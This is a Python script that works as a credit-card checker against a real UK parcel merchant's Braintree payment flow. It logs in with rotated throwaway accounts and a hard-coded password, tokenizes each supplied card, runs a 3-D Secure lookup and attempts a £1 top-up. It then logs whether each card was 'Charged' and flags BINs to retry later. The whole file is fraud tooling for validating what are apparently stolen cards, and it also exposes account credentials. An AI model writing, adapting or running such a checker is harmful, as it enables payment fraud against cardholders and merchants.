import requests
import re
import base64

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(end, string.find(start) + len(start))
    return string[start_pos + len(start): end_pos] if start_pos != -1 and end_pos != -1 else None

def chk(card):
    import random, string, user_agent, time
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    card = card.strip()
    parts = re.split('[|/:]', card)
    n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    r = requests.session()
    acc = [
    'moh5527vbnm1@gmail.com',
    'moh5527vbnm2@gmail.com', 
    'moh5527vbnm3@gmail.com',
    'moh5527vbnm4@gmail.com',
    'moh5527vbnm5@gmail.com',
    'moh5527vbnm6@gmail.com',
    'moh5527vbnm7@gmail.com',
    'moh5527vbnm8@gmail.com',
    'moh5527vbnm9@gmail.com',
    'moh5527vbnm10@gmail.com',
    'moh5527vbnm11@gmail.com',
    'moh5527vbnm12@gmail.com',
    'moh5527vbnm13@gmail.com',
    'moh5527vbnm14@gmail.com',
    'moh5527vbnm15@gmail.com'
]

    email = random.choice(acc)

    # Step 1: Open login page
    headers = {
        'authority': 'www.parcelmonkey.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'return': 'https://www.parcelmonkey.co.uk/prepay.php?sub=topup',
    }

    r.get('https://www.parcelmonkey.co.uk/login.php', params=params, headers=headers)

    # Step 2: Login
    headers['content-type'] = 'application/x-www-form-urlencoded'
    headers['origin'] = 'https://www.parcelmonkey.co.uk'
    headers['referer'] = 'https://www.parcelmonkey.co.uk/login.php?return=https%3A%2F%2Fwww.parcelmonkey.co.uk%2Fprepay.php%3Fsub%3Dtopup'

    data = {
        'UserEmail': email,
        'UserPassword': 'jojo@ALi123',
    }

    r.post('https://www.parcelmonkey.co.uk/login.php', params=params, headers=headers, data=data)

    # Step 3: Get authorization token
    headers.pop('content-type', None)
    headers.pop('origin', None)
    headers.pop('referer', None)

    response = r.get('https://www.parcelmonkey.co.uk/prepay.php', params={'sub': 'topup'}, headers=headers)
    enc = re.search(r'authorization: *[\'"]([^\'"]+)[\'"]', response.text)

    if enc:
        dec = base64.b64decode(enc.group(1)).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    else:
        return "Failed to get authorization token"

    # Step 4: Tokenize card
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': '8447284e-b2f5-488e-b3fa-c9784f7115c8',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']

    # Step 5: Get 3D Secure nonce
    headers = {
        'authority': 'api.braintreegateway.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.parcelmonkey.co.uk',
        'pragma': 'no-cache',
        'referer': 'https://www.parcelmonkey.co.uk/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'amount': '1',
        'additionalInfo': {
            'acsWindowSize': '03',
        },
        'authorizationFingerprint': au,
        'braintreeLibraryVersion': 'braintree/web/3.92.1',
        '_meta': {
            'merchantAppId': 'www.parcelmonkey.co.uk',
        },
    }

    response = r.post(
        f'https://api.braintreegateway.com/merchants/34vnk7kykg3kphwf/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
        headers=headers,
        json=json_data,
    )
    nonce = response.json()['paymentMethod']['nonce']

    # Step 6: Final charge
    headers = {
        'authority': 'www.parcelmonkey.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://www.parcelmonkey.co.uk/prepay.php?sub=topup',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'sub': 'topup',
        'amount': '1',
        'payment_method_nonce': nonce,
        'deviceData': 'undefined',
        'return_url': '',
    }

    response = r.get('https://www.parcelmonkey.co.uk/prepay.php', params=params, headers=headers)

    # Step 7: Parse result based on new logic
    text = response.text
    pattern = r'alert alert-danger">.*?<br\s*/?>([^<]+)'
    match = re.search(pattern, text)

    if match and match.group(1):
        reason = match.group(1).strip()
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
        elif "duplicate" in reason.lower():  # إذا كانت الاستجابة تحتوي على "duplicate"
            result = "Charged"
        else:
            result = reason
    else:
        result = "Charged"  # إذا لم يتم العثور على سبب

    # Save result to file
    with open("results.txt", "a", encoding="utf-8") as file:
        file.write(f"{card} -> {result}\n")

    return result
